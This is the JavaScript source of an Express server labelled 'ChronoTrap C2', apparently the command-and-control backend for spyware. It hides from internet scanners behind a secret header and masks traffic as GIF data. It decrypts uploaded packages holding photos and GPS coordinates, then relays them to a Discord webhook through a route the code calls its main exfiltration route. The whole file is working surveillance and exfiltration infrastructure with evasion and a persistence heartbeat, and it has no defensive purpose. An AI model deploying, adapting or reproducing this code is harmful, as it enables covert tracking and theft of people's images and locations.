const express = require('express');
const crypto = require('crypto');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const app = express();

// Railway uses 8080 by default based on your screenshot
const PORT = process.env.PORT || 8080; 
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK; 
const SECRET_PASSPHRASE = "neural-link-omega-99"; 
const STEALTH_TOKEN = "delta-v-882-alpha";
const GIF_MASK = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";

app.use(express.json({ limit: '50mb' }));

/**
 * EVASION MIDDLEWARE
 * Scanners (Shodan, Censys) will get a 404.
 * Only the NeuralScan client with the secret header gets through.
 */
app.use((req, res, next) => {
    if (req.path === '/save-photo' || req.path === '/heartbeat') {
        const token = req.header('X-Neural-Token');
        if (token !== STEALTH_TOKEN) {
            console.log(`[!] Evasion: Blocked unauthorized scan from IP: ${req.ip}`);
            return res.status(404).send('Not Found');
        }
    }
    next();
});

/**
 * AUTHENTICATED DECRYPTION (AES-256-GCM)
 */
function decryptPackage(maskedData) {
    try {
        const jsonString = Buffer.from(maskedData.replace(GIF_MASK, ""), 'base64').toString();
        const { iv, content } = JSON.parse(jsonString);
        
        const salt = Buffer.from("neural-static-salt");
        const key = crypto.pbkdf2Sync(SECRET_PASSPHRASE, salt, 100000, 32, 'sha256');

        const ivBuffer = Buffer.from(iv, 'base64');
        const encryptedBuffer = Buffer.from(content, 'base64');
        const tag = encryptedBuffer.slice(encryptedBuffer.length - 16);
        const ciphertext = encryptedBuffer.slice(0, encryptedBuffer.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, ivBuffer);
        decipher.setAuthTag(tag);

        let decrypted = decipher.update(ciphertext, 'binary', 'utf8') + decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (err) {
        return null;
    }
}

// PERSISTENCE HEARTBEAT
app.head('/heartbeat', (req, res) => res.sendStatus(200));

// MAIN EXFILTRATION ROUTE
app.post('/save-photo', async (req, res) => {
    const intel = decryptPackage(req.body.data);
    if (!intel) return res.status(404).send();

    if (DISCORD_WEBHOOK) {
        try {
            const buffer = Buffer.from(intel.image.split(',')[1], 'base64');
            const form = new FormData();
            form.append('file', buffer, { filename: 'intel.jpg' });
            
            form.append('payload_json', JSON.stringify({
                embeds: [{
                    title: "🛰️ NEURALSCAN: CHRONOTRAP INTEL",
                    color: 0x6366f1,
                    fields: [
                        { name: "📍 Coordinates", value: `\`${intel.metadata.location.lat}, ${intel.metadata.location.lon}\``, inline: true },
                        { name: "🕒 Timestamp", value: intel.metadata.ts, inline: true }
                    ],
                    image: { url: "attachment://intel.jpg" },
                    footer: { text: "ChronoTrap C2 | Railway.app Deployment" }
                }]
            }));

            await axios.post(DISCORD_WEBHOOK, form, { headers: form.getHeaders() });
        } catch (e) {
            console.error("[-] Discord relay failed.");
        }
    }
    res.sendStatus(200);
});

// Serve Static Files
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/sw.js', (req, res) => res.sendFile(path.join(__dirname, 'sw.js')));

// FALLBACK
app.use((req, res) => res.status(404).send('Not Found'));

// Bind to 0.0.0.0 for Railway networking
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 ChronoTrap C2 Online`);
    console.log(`📡 Listening on Port: ${PORT}`);
});
